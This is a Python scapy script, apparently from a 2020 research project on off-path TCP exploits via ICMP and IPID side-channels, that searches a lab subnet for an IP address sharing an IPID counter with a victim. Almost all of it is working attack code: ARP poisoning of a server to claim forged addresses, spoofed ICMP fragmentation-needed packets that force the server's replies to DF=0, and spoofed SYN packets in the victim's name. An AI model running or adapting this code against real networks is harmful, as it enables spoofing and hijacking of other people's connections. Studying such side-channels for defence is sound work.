# coding=utf-8

import struct
import threading
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *

"""
    @CreateDate:    2020/1/22
    @Group:         Off-Path TCP Exploit Via ICMP
                    and IPID Side-Channel
    @Project:       Work2
    @Filename:      collision_find.py (renamed)
    @Brief:         This program is used for finding a collision IP address. This 
                    means target ip address will share its IPID counter with victim 
                    when they interact with Mallory.
                    This program is different form single_check while this program 
                    utilizes multi-thread to check the potential address concurrently.
    @Modify:        2020/2/1    Kevin.F:    Change scapy version 2.4.3
                    2020/2/1    Kevin.F:    Adjust import at line 7
                    2020/2/1    Kevin.F:    For ARP poison, add started-callback
                    2020/2/1    Kevin.F:    IPID as a critical resource
                    2020/2/2    Kevin.F:    Change ARP poison logic
                    2020/2/5    Kevin.F:    Change collision check logic as send-sniff style
"""

forge_ip_prefix = '10.10.'                  # used for construct a address pool
victim_ip = '10.10.100.1'                   # victim ip address
server_ip = '10.10.100.2'                   # server ip address
server_mac_addr = '00:0c:29:20:f4:8c'       # mac address of server used for ARP poison
my_if_name = 'ens33'                        # bind one ethernet interface
my_mac_addr = get_if_hwaddr(my_if_name)     # mac address of attacker
z_payload = b''                             # full-zero byte string used for padding
NUM_T = 20                                  # number of checking thread

# Critical Resource
semaphore = threading.Semaphore(1)          # write-lock semaphore
semaphore_ipid = threading.Semaphore(1)     # semaphore for IPID (prevent oblivious collision)
num1 = 2                                    # '100.100.' + num1
num2 = 2                                    # '100.100.num1.' + num2
found = False                               # collision address has been found?
result = 'no result'                        # collision result


"""
    @Date:      2020/1/19
    @Author:    Kevin.F
    @Param:     forged_ip -> The forged ip address which we are checking collision now.
    @Return:    None
    @Brief:     In real world practice, we need a big address pool for this attack.
                But for simplifying the experiment, we pretend to have a big pool
                in such a subnet.
                We utilized arp-poison attack to fool the server that we own such a
                IP address in the pool. 
"""
def arp_inject(forged_ip):
    # here we send a UDP packet to allure server to execute ip/mac convert
    # if we got no reply, we can deduce that arp poisoned before is not expired now
    pkt = sniff(filter="arp " + "and dst " + forged_ip + " and ether src " + server_mac_addr,
                iface=my_if_name, count=1, timeout=0.3, started_callback=
                lambda: send(IP(src=forged_ip, dst=server_ip) / UDP(dport=80),
                             iface=my_if_name, verbose=False))
    if len(pkt) == 1 and pkt[0][1].fields['psrc'] == server_ip and pkt[0][1].fields['pdst'] == forged_ip:
        send(ARP(pdst=server_ip, hwdst=server_mac_addr, psrc=forged_ip, hwsrc=my_mac_addr, op=2),
             iface=my_if_name, verbose=False)


"""
    @Date:      2020/1/19
    @Author:    Kevin.F
    @Param:     forged_ip ->  The forged ip address which we are checking collision now.
                D         ->  Number of checking routine. Higher D means higher confidence.
    @Return:    True      ->  The param forged_ip maybe a collision address.
                False     ->  The param forged_ip must not be a collision.
    @Brief:     This function is used for checking whether forged_ip is a collision.
                This function follow the step in slide (page 10,11).
                This function CAN NOT make sure an address is a collision with 100% sure,
                because the increment rule of the counters.
"""
def check_collision(forged_ip, D):
    negative = 0
    # repeat the test N times to counter uncertainty
    for i in range(0, D):
        # Note. we must use one sr() to send all three packets to reduce
        # the delay, and try to make sure the counter add only 1
        # Note. there must be a service on dst port. Because we want server
        # to reply a SYN-ACK rather than a RST
        semaphore_ipid.acquire()
        pkts = sniff(filter="icmp and dst " + forged_ip,
                    iface=my_if_name, count=2, timeout=0.2, started_callback=
                    lambda: send([
                            IP(src=forged_ip, dst=server_ip) / ICMP(),
                            IP(src=victim_ip, dst=server_ip) / TCP(sport=RandShort(), dport=22, flags='S'),
                            IP(src=forged_ip, dst=server_ip) / ICMP()
                            ], iface=my_if_name, verbose=False))
        semaphore_ipid.release()

        if len(pkts) == 2:
            ipid1 = pkts[0][1].fields['id']
            ipid2 = pkts[1][1].fields['id']

            if abs(ipid2 - ipid1) >= 2:
                negative += 1
            else:
                break

        else:
            i -= 1

    if negative == D:
        return True
    else:
        return False

"""
    @Date:      2020/1/19
    @Author:    Kevin.F
    @Param:     forged_ip ->  The forged ip address which we are checking collision now.
    @Return:    True ->       The param forged_ip maybe a collision address.
                False ->      The param forged_ip must not be a collision.
    @Brief:     Thread template used for fetch a new address for the pool and check it.
"""
def check_new():
    global found
    global num1
    global num2
    global result

    # if the result has been found or run out of addresses
    if found == True or num1 == 128:
        print(result)
        return

    # entry of critical zone
    semaphore.acquire()
    forge_ip = forge_ip_prefix + str(num1) + '.' + str(num2)
    num2 += 1
    if num2 == 254:
        num2 = 2
        num1 += 1
        print('Now num1=' + str(num1))
    semaphore.release()
    # print('Now we are checking ' + forge_ip)

    # before checking, we need to execute an ARP poison attack for forged ip address
    arp_inject(forge_ip)

    # Send fragment needed ICMP, force TCP set DF as 0
    send(IP(src=forge_ip, dst=server_ip) /
         ICMP(type=3, code=4, nexthopmtu=68) /
         IP(flags=2, src=server_ip, dst=victim_ip) /
         ICMP(type=0, code=0) /
         z_payload,
         iface=my_if_name, verbose=False)

    if check_collision(forge_ip, 1):
        # when an address is suspected of collision, we check it again and again
        if check_collision(forge_ip, 1) and check_collision(forge_ip, 2) and check_collision(forge_ip,8):
            semaphore.acquire()
            result = forge_ip
            found = True
            semaphore.release()
            print('Collision Found! ' + result)
    else:
        # print(forge_ip + ' no Collision.')
        pass

    # invoke another thread again
    t = threading.Thread(target=check_new)
    t.start()


if __name__ == '__main__':
    # construct padding payload
    for i in range(0, 520):
        z_payload += struct.pack('B', 0)

    # create sub-threads
    for i in range(0, NUM_T):
        t = threading.Thread(target=check_new, name=('T' + str(i)))
        t.start()
        print('Num_' + str(i) + ' thread started.')
